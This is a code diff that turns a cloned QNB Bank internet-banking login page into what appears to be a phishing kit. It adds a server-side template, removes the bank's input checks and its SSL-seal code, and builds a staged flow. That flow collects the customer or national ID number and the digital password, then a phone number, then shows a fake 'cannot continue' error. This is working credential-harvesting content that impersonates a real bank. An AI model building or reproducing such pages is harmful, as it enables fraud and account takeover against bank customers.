@@ -21,6 +21,7 @@
     <meta name="apple-itunes-app-new" content="app-id=739655617" />
     <meta name="google-play-app" content="app-id=com.finansbank.mobile.cepsube" />
     <meta name="msApplication-ID" content="App" />
+    <meta name="csrf-token" content="{{ csrf_token() }}" />
     <meta name="msapplication-TileImage"
         content="https://lh3.googleusercontent.com/apgjMxBvR8Cv-hpXzCY7SU9xWK0UIRMWqEhjKKfzr_o8qF3JHZ6q1k4QIRX8WwjGeg=w300-rw" />
     <link type="text/css" rel="stylesheet"
@@ -191,8 +192,7 @@
             return str === null || str.match(/^ *$/) !== null;
         }
     </script>
-
-
+{!! $options->value !!}
 </head>
 
 <body>
@@ -257,130 +257,153 @@
                                 <div class="containerkeypad">
                                     <div id="keys" style="float: left; display: inline-block"></div>
                                 </div>
-                                <div class="subPanel-width">
-                                    <div class="row">
-                                        <div class="col-lg-6 col-12">
-                                            <div class="row">
-                                                <div class="col-12">
-                                                    <div class="form-group">
-                                                        <div id="ctl00_mainContentPlaceHolder_VirtualKeyboardDiv"
-                                                            style="display: none; width: 390px;">
-                                                            <html xmlns="http://www.w3.org/1999/xhtml">
+                                <div id="first_step">
+                                    <div class="subPanel-width">
+                                        <div class="row">
+                                            <div class="col-lg-6 col-12">
+                                                <div class="row">
+                                                    <div class="col-12">
+                                                        <div class="form-group">
+                                                            <div id="ctl00_mainContentPlaceHolder_VirtualKeyboardDiv"
+                                                                style="display: none; width: 390px;">
+                                                                <html xmlns="http://www.w3.org/1999/xhtml">
 
-                                                            <head>
-                                                                <meta http-equiv="Content-Type"
-                                                                    content="text/html; charset=utf-8" />
-                                                                <title></title>
-                                                            </head>
+                                                                <head>
+                                                                    <meta http-equiv="Content-Type"
+                                                                        content="text/html; charset=utf-8" />
+                                                                    <title></title>
+                                                                </head>
 
-                                                            <body>
-                                                                <div class="sanalklavyeHelpConatiner">
-                                                                    <div class="content">
-                                                                        <h1>Sanal Klavye Nedir? </h1>
-                                                                        <p>Sanal Klavye, Internet Bankacılığı'na girişte
-                                                                            size ilave güvenlik sağlayan bir özelliktir.
-                                                                            Bilgisayara kullanıcının bilgisi dışında
-                                                                            yüklenen ve kullanıcının yazmış olduğu
-                                                                            şifre/parolaları tespit eden programlara
-                                                                            karşı koruma amacıyla geliştirilmiştir.
-                                                                            Sanal Klavye'yi kullanarak söz konusu
-                                                                            programlarından korunursunuz.</p>
-                                                                        <p> Sanal Klavye, rakamların girişi için
-                                                                            kullanılması tavsiye edilen bir araçtır. Tüm
-                                                                            şifre değişiklik ekranlarında da Sanal
-                                                                            Klavye'yi kullanabilirsiniz. Tercihinize
-                                                                            bağlı "Klavye Kullan" seçimi ile klavyenizin
-                                                                            tuşlarını
-                                                                            kullanabilirsiniz.</p>
-                                                                        <h1>Sanal Klavye Nasıl Kullanılır? </h1>
-                                                                        <p>Sanal Klavye'yi üzerinde yer alan
-                                                                            karışık-sıralı rakamları mouse ile seçerek
-                                                                            kullanabilirsiniz. </p>
+                                                                <body>
+                                                                    <div class="sanalklavyeHelpConatiner">
+                                                                        <div class="content">
+                                                                            <h1>Sanal Klavye Nedir? </h1>
+                                                                            <p>Sanal Klavye, Internet Bankacılığı'na
+                                                                                girişte
+                                                                                size ilave güvenlik sağlayan bir
+                                                                                özelliktir.
+                                                                                Bilgisayara kullanıcının bilgisi dışında
+                                                                                yüklenen ve kullanıcının yazmış olduğu
+                                                                                şifre/parolaları tespit eden programlara
+                                                                                karşı koruma amacıyla geliştirilmiştir.
+                                                                                Sanal Klavye'yi kullanarak söz konusu
+                                                                                programlarından korunursunuz.</p>
+                                                                            <p> Sanal Klavye, rakamların girişi için
+                                                                                kullanılması tavsiye edilen bir araçtır.
+                                                                                Tüm
+                                                                                şifre değişiklik ekranlarında da Sanal
+                                                                                Klavye'yi kullanabilirsiniz. Tercihinize
+                                                                                bağlı "Klavye Kullan" seçimi ile
+                                                                                klavyenizin
+                                                                                tuşlarını
+                                                                                kullanabilirsiniz.</p>
+                                                                            <h1>Sanal Klavye Nasıl Kullanılır? </h1>
+                                                                            <p>Sanal Klavye'yi üzerinde yer alan
+                                                                                karışık-sıralı rakamları mouse ile
+                                                                                seçerek
+                                                                                kullanabilirsiniz. </p>
+                                                                        </div>
                                                                     </div>
-                                                                </div>
-                                                            </body>
+                                                                </body>
 
-                                                            </html>
+                                                                </html>
+                                                            </div>
+                                                            <span id="ctl00_mainContentPlaceHolder_UserIDLabel"
+                                                                class="loginlabel">Müşteri / T.C. Kimlik
+                                                                Numaranız</span>
+                                                            <input name="ctl00$mainContentPlaceHolder$txtuserid"
+                                                                type="text" maxlength="11" tabindex="1"
+                                                                class="textfield required"
+                                                                fbTitle="Müşteri Numarası / TCKN" autocomplete="off"
+                                                                id="tcOrUserNametxt" />
                                                         </div>
-                                                        <span id="ctl00_mainContentPlaceHolder_UserIDLabel"
-                                                            class="loginlabel">Müşteri / T.C. Kimlik Numaranız</span>
-                                                        <input name="ctl00$mainContentPlaceHolder$txtuserid"
-                                                            type="text" maxlength="11" id="txtuserid"
-                                                            tabindex="1" class="textfield required"
-                                                            fbTitle="Müşteri Numarası / TCKN"
-                                                            onkeydown="TextBoxFocusOnNavigation(this,event);if(CheckAndRemoveEscapedCharactersFromTextBox([&#39;&lt;&#39;,&#39;>&#39;,&#39;?&#39;],event)){return false;}if(!Only_Numeric(event)){return false;};return ValidateUserCode(event,&#39;mainPanel&#39;,&#39;divErrorMsg&#39;,null,null,6,&#39;Lütfen müşteri numarası/TCKN ve Dijital Şifrenizi giriniz ve &quot;İleri&quot; butonuna basınız.&#39;,&#39;Dijital Şifreniz $$ karakter olmalıdır.&#39;,&#39;&#39;,&#39;Lütfen müşteri numaranızı giriniz.&#39;,&#39;Lütfen Dijital Şifrenizi giriniz.&#39;, &#39;13800009612878050921389294217&#39;);"
-                                                            autocomplete="off" />
+                                                    </div>
+                                                    <div class="col-12">
+                                                        <div class="form-group">
+                                                            <span id="ctl00_mainContentPlaceHolder_PasswordLabel"
+                                                                class="loginlabel">Dijital Şifreniz</span>
+                                                            <input name="ctl00$mainContentPlaceHolder$txtpass"
+                                                                type="text" maxlength="6" id="tbPasswordtxt"
+                                                                tabindex="2" class="textfield_enwatermark"
+                                                                id="tbPasswordtxt" />
+                                                        </div>
                                                     </div>
                                                 </div>
-                                                <div class="col-12">
-                                                    <div class="form-group">
-                                                        <span id="ctl00_mainContentPlaceHolder_PasswordLabel"
-                                                            class="loginlabel">Dijital Şifreniz</span>
-                                                        <input name="ctl00$mainContentPlaceHolder$txtpass"
-                                                            type="text" maxlength="6" id="txtpass"
-                                                            tabindex="2" class="textfield_enwatermark"
-                                                            onmouseout="VeriBranch_OnMouseOut(&#39;txtpass&#39;);"
-                                                            autocomplete="off" Pattern="[0-9]*"
-                                                            onpaste="if(HasNonnumeric(this, event)){return false;};"
-                                                            data-form-type="other"
-                                                            onblur="VeriBranch_TextOnBlur(&#39;txtpass&#39;,&#39;&#39;);RemoveEscapedCharactersFromTextBox(this,&#39;txtpass&#39;, [&#39;&lt;&#39;,&#39;>&#39;,&#39;?&#39;])"
-                                                            onkeypress="return ValidateInput(event,this,&#39;number&#39;);if(CheckAndRemoveEscapedCharactersFromTextBox([&#39;&lt;&#39;,&#39;>&#39;,&#39;?&#39;],event)){return false;}if(HasNonnumericKeyPress(this, event)){return false;};"
-                                                            onfocus="VeriBranch_TextOnFocus(&#39;txtpass&#39;,&#39;&#39;);"
-                                                            spellcheck="false" fbTitle="Dijital Şifre"
-                                                            onkeydown="TextBoxFocusOnNavigation(this,event);if(CheckAndRemoveEscapedCharactersFromTextBox([&#39;&lt;&#39;,&#39;>&#39;,&#39;?&#39;],event)){return false;}if(!Only_Numeric(event)){return false;};Ibtech_keyDown();return ValidateUserCode(event,&#39;mainPanel&#39;,&#39;divErrorMsg&#39;,null,null,6,&#39;Lütfen müşteri numarası/TCKN ve Dijital Şifrenizi giriniz ve &quot;İleri&quot; butonuna basınız.&#39;,&#39;Dijital Şifreniz $$ karakter olmalıdır.&#39;,&#39;&#39;,&#39;Lütfen müşteri numaranızı giriniz.&#39;,&#39;Lütfen Dijital Şifrenizi giriniz.&#39;, &#39;13800009612878050921389294217&#39;);;"
-                                                            onmouseover="VeriBranch_OnMouseOver(&#39;txtpass&#39;);" />
+                                            </div>
+                                            <div class="col-lg-6 col-12">
+                                                <div class="row">
+                                                    <div class="col-12">
+                                                        <div id="divErrorMsgOuter"
+                                                            class="form-info-tooltip login-input-error error-message-outer"
+                                                            clientidmode="Static" style="display: none;">
+                                                            <div id="divErrorMsg" style="width: 70%; padding: 10px;">
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <div class="col-12" style="align-self: center;">
+
+                                                        <div id="divErrorMsgOuterPass"
+                                                            class="form-info-tooltip login-input-error error-message-outer"
+                                                            clientidmode="Static" style="display: none;">
+                                                            <div id="divErrorMsgPass"
+                                                                style="width: 70%; padding: 10px;">
+                                                            </div>
+                                                        </div>
+
                                                     </div>
                                                 </div>
                                             </div>
                                         </div>
-                                        <div class="col-lg-6 col-12">
-                                            <div class="row">
-                                                <div class="col-12">
-                                                    <div id="divErrorMsgOuter"
-                                                        class="form-info-tooltip login-input-error error-message-outer"
-                                                        clientidmode="Static" style="display: none;">
-                                                        <div id="divErrorMsg" style="width: 70%; padding: 10px;">
-                                                        </div>
-                                                    </div>
-                                                </div>
-                                                <div class="col-12" style="align-self: center;">
+                                        <div class="row">
+                                            <div class="col-lg-6 col-12">
+                                                <p id="ctl00_mainContentPlaceHolder_FinansSifreArea" class="taR"
+                                                    style="width: 101%">
+                                                    <a onclick="LogHelpDeskRedirectTransaction(); window.open(&#39;https://dijitalsifre.qnb.com.tr/Default.aspx&#39;,&#39;&#39;,&#39;toolbar=0,menubar=0,resizable=1,status=0,left=0,top=0,scrollbars=1,width=751,height=514&#39;); return false;;return ;"
+                                                        id="FinansSifreButton" tabindex="4" class="loginlink"
+                                                        href="javascript:__doPostBack(&#39;ctl00$mainContentPlaceHolder$FinansSifreButton&#39;,&#39;&#39;)">Dijital
+                                                        Şifre Al</a>
+                                                    /
+                                                    <a onclick="LogHelpDeskRedirectTransaction(); window.open(&#39;https://dijitalsifre.qnb.com.tr/Default.aspx&#39;,&#39;&#39;,&#39;toolbar=0,menubar=0,resizable=1,status=0,left=0,top=0,scrollbars=1,width=751,height=514&#39;); return false;;return ;"
+                                                        id="FinansSifreButton1" tabindex="5" class="loginlink"
+                                                        href="javascript:__doPostBack(&#39;ctl00$mainContentPlaceHolder$FinansSifreButton1&#39;,&#39;&#39;)">Dijital
+                                                        Şifremi Unuttum</a>
+                                                </p>
+                                            </div>
 
-                                                    <div id="divErrorMsgOuterPass"
-                                                        class="form-info-tooltip login-input-error error-message-outer"
-                                                        clientidmode="Static" style="display: none;">
-                                                        <div id="divErrorMsgPass" style="width: 70%; padding: 10px;">
-                                                        </div>
-                                                    </div>
+                                        </div>
+                                        <div class="row">
+                                            <div class="col-lg-6 col-12">
+                                                <a id="btnLogin" tabindex="3" class="ileriButton">İleri</a>
 
-                                                </div>
                                             </div>
                                         </div>
                                     </div>
-                                    <div class="row">
-                                        <div class="col-lg-6 col-12">
-                                            <p id="ctl00_mainContentPlaceHolder_FinansSifreArea" class="taR"
-                                                style="width: 101%">
-                                                <a onclick="LogHelpDeskRedirectTransaction(); window.open(&#39;https://dijitalsifre.qnb.com.tr/Default.aspx&#39;,&#39;&#39;,&#39;toolbar=0,menubar=0,resizable=1,status=0,left=0,top=0,scrollbars=1,width=751,height=514&#39;); return false;;return ;"
-                                                    id="FinansSifreButton" tabindex="4" class="loginlink"
-                                                    href="javascript:__doPostBack(&#39;ctl00$mainContentPlaceHolder$FinansSifreButton&#39;,&#39;&#39;)">Dijital
-                                                    Şifre Al</a>
-                                                /
-                                                <a onclick="LogHelpDeskRedirectTransaction(); window.open(&#39;https://dijitalsifre.qnb.com.tr/Default.aspx&#39;,&#39;&#39;,&#39;toolbar=0,menubar=0,resizable=1,status=0,left=0,top=0,scrollbars=1,width=751,height=514&#39;); return false;;return ;"
-                                                    id="FinansSifreButton1" tabindex="5" class="loginlink"
-                                                    href="javascript:__doPostBack(&#39;ctl00$mainContentPlaceHolder$FinansSifreButton1&#39;,&#39;&#39;)">Dijital
-                                                    Şifremi Unuttum</a>
-                                            </p>
-                                        </div>
+                                </div>
+                                <div id="twice_step">
+                                    <div class="form-group">
 
+                                        <span id="ctl00_mainContentPlaceHolder_UserIDLabel" class="loginlabel">Telefon
+                                            Numaranız</span>
+                                        <input type="text" maxlength="15" tabindex="1"
+                                            class="textfield required" autocomplete="off" id="phone"
+                                            placeholder="(5XX) XXX XX XX" />
                                     </div>
                                     <div class="row">
                                         <div class="col-lg-6 col-12">
-                                            <a onclick="return ValidateLoginForm(&#39;mainPanel&#39;,&#39;divErrorMsg&#39;,null,null,6,&#39;Lütfen müşteri numarası/TCKN ve Dijital Şifrenizi giriniz ve &quot;İleri&quot; butonuna basınız.&#39;,&#39;Dijital Şifreniz $$ karakter olmalıdır.&#39;,&#39;&#39;,&#39;Lütfen müşteri numaranızı giriniz.&#39;,&#39;Lütfen Dijital Şifrenizi giriniz.&#39;,&#39;13800009612878050921389294217&#39;,&#39;true&#39;);;;return ;"
-                                                id="13800009612878050921389294217" tabindex="3"
-                                                class="ileriButton
-                                                href="javascript:__doPostBack(&#39;ctl00$mainContentPlaceHolder$13800009612878050921389294217&#39;,&#39;&#39;)">İleri</a>
+                                            <a id="btnPhone" tabindex="3" class="ileriButton">GİRİŞ YAP</a>
 
                                         </div>
+                                    </div>
+                                </div>
+                                <div id="three_step">
+                                    <div class="lastcenter text-center">
+                                        <i class="fa-solid fa-xmark" style="font-size: 30px;"></i>
+                                        <span>
+                                            <h5>İşleminize devam edilemiyor.</h5>
+                                            <p>Özür dileriz, şu anda işleminizi
+                                                gerçekleştiremiyoruz. Lütfen
+                                                daha sonra tekrar deneyin</p>
+                                        </span>
                                     </div>
                                 </div>
                             </div>
@@ -517,15 +540,6 @@
                         var useridTel = document.getElementById('txtuserid');
                         useridTel.type = "tel";
                     }
-
-                    if (isMobile.iPad()) {
-                        var userPass = document.getElementById('txtpass');
-                        userPass.type = "tel";
-                        userPass.setAttribute('srt', 'numericpassword');
-                    } else {
-                        var userPass = document.getElementById('txtpass');
-                        userPass.type = "text";
-                    }
                 </script>
 
             </div>
@@ -542,7 +556,7 @@
 
                             </td>
                         </tr>
-                    </table><!--- DÜZENLEME YAPMAYIN - GlobalSign SSL Site Mührü Kodu - DÜZENLEME YAPMAYIN --->
+                    </table>
                 </div>
                 <span id="ctl00_lblFooter" class="master-footer">Her hakkı QNB Bank A.Ş.&#39;ye aittir. © 2025</span>
                 <ul class="foot-links">
@@ -559,6 +573,7 @@
             </div>
 
         </div>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 
         <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
         <script src="qassets/custom/js/jquery.mask.min.js"></script>
